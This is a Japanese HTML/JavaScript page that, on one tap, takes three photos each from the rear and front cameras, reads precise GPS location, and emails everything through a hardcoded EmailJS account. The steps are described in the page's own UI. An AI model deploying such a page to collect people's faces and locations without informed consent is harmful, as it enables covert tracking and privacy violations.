<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>カメラ＋位置＋送信（修正版）</title>
<style>
  body {
    font-family: Arial, sans-serif;
    margin: 0; padding: 20px;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white;
  }
  .container { max-width: 800px; margin: auto; text-align: center; }
  .touch-area {
    border: 2px dashed rgba(255,255,255,0.3); border-radius: 15px;
    background: rgba(255,255,255,0.1); padding: 40px; margin: 20px 0;
    cursor: pointer;
    user-select: none;
  }
  .status {
    background: rgba(0,0,0,0.4); padding: 10px; border-radius: 5px; margin-top: 10px;
  }
  .debug-info {
    background: rgba(0,0,0,0.7);
    padding: 10px;
    border-radius: 5px;
    margin-top: 15px;
    font-family: monospace;
    font-size: 12px;
    height: 150px;
    overflow-y: auto;
    text-align: left;
    display: none;
  }
  .debug-toggle {
    position: fixed; top: 10px; right: 10px;
    background: rgba(0,0,0,0.6);
    border: none;
    color: white;
    padding: 6px 12px;
    border-radius: 5px;
    cursor: pointer;
    font-size: 12px;
  }
</style>
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
</head>
<body>
<button class="debug-toggle" onclick="toggleDebug()">Debug</button>
<div class="container">
  <h1>📷 3連写＋位置送信（修正版）</h1>
  <p>外カメ → 内カメ → 位置 → EmailJS送信</p>
  <div class="touch-area" id="touchArea">▶️ タップ/クリックして実行</div>
  <div class="status" id="status">待機中</div>
  <video id="cameraVideo" autoplay muted playsinline style="display:none;"></video>
  <canvas id="photoCanvas" style="display:none;"></canvas>
  <div class="debug-info" id="debugInfo"></div>
</div>

<script>
  emailjs.init("cPjKBUm_i6HebDQF7");

  const touchArea = document.getElementById('touchArea');
  const status = document.getElementById('status');
  const debugInfo = document.getElementById('debugInfo');
  const video = document.getElementById('cameraVideo');
  const canvas = document.getElementById('photoCanvas');
  let stream = null;
  let isProcessing = false;
  let debugMode = false;

  function toggleDebug(){
    debugMode = !debugMode;
    debugInfo.style.display = debugMode ? 'block' : 'none';
    if(debugMode) {
      debugInfo.innerHTML = "[DebugモードON]<br>";
    }
  }

  function logDebug(msg) {
    const t = new Date().toLocaleTimeString();
    const line = `[${t}] ${msg}`;
    console.log(line);
    if(debugMode){
      debugInfo.innerHTML += line + "<br>";
      debugInfo.scrollTop = debugInfo.scrollHeight;
    }
  }

  function updateStatus(msg, bgColor = '') {
    status.textContent = msg;
    status.style.background = bgColor || 'rgba(0,0,0,0.4)';
    logDebug("Status: " + msg);
  }

  async function waitVideoReady(videoElem) {
    if (videoElem.readyState >= 2) return;
    return new Promise(resolve => {
      videoElem.onloadedmetadata = () => resolve();
    });
  }

  async function capturePhotos(facingMode) {
    updateStatus(`📸 ${facingMode}カメラ撮影中...`, "#ffa726");
    try {
      if (stream) {
        logDebug("既存ストリーム停止");
        stream.getTracks().forEach(t => t.stop());
        stream = null;
      }
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode }, audio: false
      });
      video.srcObject = stream;
      video.style.display = 'block';

      await waitVideoReady(video);
      logDebug(`ビデオストリーム開始。解像度: ${video.videoWidth}x${video.videoHeight}`);

      const ctx = canvas.getContext('2d');
      const photos = [];
      for (let i = 0; i < 3; i++) {
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const dataUrl = canvas.toDataURL('image/jpeg', 0.15);
        photos.push(dataUrl);
        logDebug(`撮影 ${i + 1} 枚目 サイズ: ${Math.round(dataUrl.length / 1024)} KB`);
        await new Promise(r => setTimeout(r, 50));
      }

      stream.getTracks().forEach(t => t.stop());
      stream = null;
      video.style.display = 'none';
      logDebug(`${facingMode}カメラ撮影完了`);
      return photos;

    } catch (e) {
      updateStatus("📸 カメラエラー", "#ef5350");
      logDebug(`カメラエラー: ${e.message || e}`);
      throw e;
    }
  }

  async function getLocationInfo() {
    updateStatus("📍 位置情報取得中...", "#29b6f6");
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject(new Error("位置情報非対応"));
        return;
      }
      navigator.geolocation.getCurrentPosition(
        pos => {
          const loc = {
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            acc: pos.coords.accuracy,
            time: new Date(pos.timestamp).toLocaleString()
          };
          logDebug(`位置情報取得成功: 緯度${loc.lat}, 経度${loc.lon}, 精度${loc.acc}m`);
          resolve(loc);
        },
        err => {
          logDebug(`位置情報取得失敗: ${err.message}`);
          reject(err);
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    });
  }

  async function sendEmail({ rearPhotos, frontPhotos, location }) {
    updateStatus("✉️ Email送信中...", "#29b6f6");
    rearPhotos.forEach((p, i) => logDebug(`外カメ写真${i + 1}サイズ: ${Math.round(p.length / 1024)} KB`));
    frontPhotos.forEach((p, i) => logDebug(`内カメ写真${i + 1}サイズ: ${Math.round(p.length / 1024)} KB`));
    logDebug(`位置情報: 緯度${location.lat}, 経度${location.lon}, 精度${location.acc}m`);

    const templateParams = {
      photo_rear1: rearPhotos[0],
      photo_rear2: rearPhotos[1],
      photo_rear3: rearPhotos[2],
      photo_front1: frontPhotos[0],
      photo_front2: frontPhotos[1],
      photo_front3: frontPhotos[2],
      location_info: `緯度: ${location.lat}<br>経度: ${location.lon}<br>精度: ${location.acc}m<br>時刻: ${location.time}`,
      date: new Date().toLocaleString()
    };

    try {
      await emailjs.send('service_ja2c09x', 'template_2fp2jrg', templateParams);
      updateStatus("✅ メール送信完了！", "#66bb6a");
      logDebug("EmailJS送信成功");
    } catch (e) {
      updateStatus("❌ メール送信失敗", "#ef5350");
      const errMsg = e && e.text ? e.text : (e && e.message ? e.message : JSON.stringify(e));
      logDebug(`EmailJS送信エラー: ${errMsg}`);
      throw e;
    }
  }

  async function runAll() {
    if (isProcessing) {
      logDebug("❌ 処理中です。二重実行を防止します。");
      return;
    }
    isProcessing = true;
    try {
      updateStatus("🔄 外カメ撮影...", "#ffa726");
      const rearPhotos = await capturePhotos("environment");

      updateStatus("🔄 内カメ撮影...", "#ffa726");
      const frontPhotos = await capturePhotos("user");

      let location;
      try {
        location = await getLocationInfo();
      } catch (e) {
        location = {
          lat: "取得失敗",
          lon: "取得失敗",
          acc: "不明",
          time: new Date().toLocaleString()
        };
        updateStatus("⚠️ 位置情報失敗", "#ffb300");
      }

      await sendEmail({ rearPhotos, frontPhotos, location });
    } catch (e) {
      logDebug("全体処理エラー: " + (e.message || e));
      updateStatus("❌ 全体処理中にエラー", "#ef5350");
    } finally {
      isProcessing = false;
    }
  }

  touchArea.addEventListener('click', runAll);
  touchArea.addEventListener('touchstart', e => {
    e.preventDefault();
    runAll();
  }, { passive: false });
</script>
</body>
</html>
